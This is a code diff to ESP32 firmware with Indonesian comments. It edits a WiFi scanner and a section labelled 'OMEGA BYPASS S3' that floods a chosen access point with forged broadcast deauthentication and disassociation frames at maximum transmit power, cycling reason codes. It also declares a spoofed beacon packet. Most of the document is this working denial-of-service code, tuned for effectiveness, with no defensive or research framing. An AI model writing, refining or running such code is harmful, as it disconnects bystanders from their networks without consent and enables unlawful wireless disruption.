@@ -14,6 +14,7 @@ void stringToMac(String macStr, uint8_t *macAddr) {
 }
 
 
+
 uint8_t beaconPacket[128] = {
     0x80, 0x00, // Frame Control: Beacon
     0x00, 0x00, // Duration
@@ -95,15 +96,12 @@ void loopWiFi(void * pvParameters) {
     } 
     
     // --- 2. LOGIKA WIFI SCANNER ---
-    else if (triggerScan) {
+   else if (triggerScan) {
       sedang_scan = true;
-      adaTarget = false;
-      targetLockedIdx = -1;
       totalWiFi = 0;
       WiFi.mode(WIFI_STA);
       WiFi.disconnect();
-      vTaskDelay(100 / portTICK_PERIOD_MS);
-
+      delay(100);
       int n = WiFi.scanNetworks();
       totalWiFi = (n > 30) ? 30 : n;
       for (int i = 0; i < totalWiFi; ++i) {
@@ -113,9 +111,7 @@ void loopWiFi(void * pvParameters) {
         listWiFi[i].channel = WiFi.channel(i);
         listWiFi[i].mac = WiFi.BSSIDstr(i);
       }
-      sedang_scan = false;
-      scanDone = true;
-      triggerScan = false;
+      sedang_scan = false; scanDone = true; triggerScan = false;
     }
 
     // --- 3. LOGIKA DEAUTH (OMEGA BYPASS S3) ---
@@ -123,38 +119,43 @@ void loopWiFi(void * pvParameters) {
             else if (isDeauthing && adaTarget) {
       if (!deauthUdahSetup) {
         esp_wifi_stop();
-        esp_wifi_set_mode(WIFI_MODE_APSTA); // Mode Dual biar S3 bingung
-        esp_wifi_start();
-        esp_wifi_set_ps(WIFI_PS_NONE);      // MATIIN POWER SAVE (WAJIB!)
+        delay(5);
+        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+        esp_wifi_init(&cfg);
+        esp_wifi_set_mode(WIFI_MODE_STA);
+        
+        wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL };
+        esp_wifi_set_promiscuous_filter(&filter);
         esp_wifi_set_promiscuous(true);
+        
         esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
+        esp_wifi_set_max_tx_power(78); 
+        esp_wifi_set_ps(WIFI_PS_NONE); // Tetap pake ini biar radio gak tidur
+        
         deauthUdahSetup = true;
       }
 
-      uint8_t targetMAC[6], gatewayMAC[6];
-      stringToMac(targetTerkunci.mac, gatewayMAC); // Target BSSID (AP)
+      uint8_t gatewayMAC[6];
+      stringToMac(targetTerkunci.mac, gatewayMAC); 
       uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-      // Peluru ala Bruce: Kita tembak AP dan Client sekaligus
-      uint8_t packet[26];
-      uint8_t reasons[] = {0x01, 0x04, 0x06, 0x07}; // Reason codes sakti
+      uint8_t pkt[26];
+      uint8_t reason_codes[] = {0x01, 0x04, 0x06, 0x07, 0x08};
+      static int r_idx = 0;
+      r_idx = (r_idx + 1) % 5;
 
-      for (int i = 0; i < 40; i++) {
-        uint8_t r = reasons[esp_random() % 4];
+      // Build & Send Deauth
+      buildOptimizedDeauthFrame(pkt, broadcast, gatewayMAC, gatewayMAC, reason_codes[r_idx], false);
+      esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false); // <--- PAKE FALSE SESUAI BRUCE
 
-        // 1. Tembak Deauth: AP -> All Clients (Broadcast)
-        buildOptimizedDeauthFrame(packet, broadcast, gatewayMAC, gatewayMAC, r, false);
-        esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, true); // PAKE TRUE COK!
+      // Build & Send Disassoc
+      buildOptimizedDeauthFrame(pkt, broadcast, gatewayMAC, gatewayMAC, reason_codes[r_idx], true);
+      esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false); // <--- PAKE FALSE SESUAI BRUCE
 
-        // 2. Tembak Disassoc: AP -> All Clients (Broadcast)
-        packet[0] = 0xA0;
-        esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, true); // PAKE TRUE COK!
-
-        delayMicroseconds(150);
-      }
-      vTaskDelay(1 / portTICK_PERIOD_MS);
+      delay(5); // Kasih napas dikit
     }
 
+   
 
 
     // --- 4. CLEANUP (MATIIN RADIO KALO GAK DIPAKE) ---
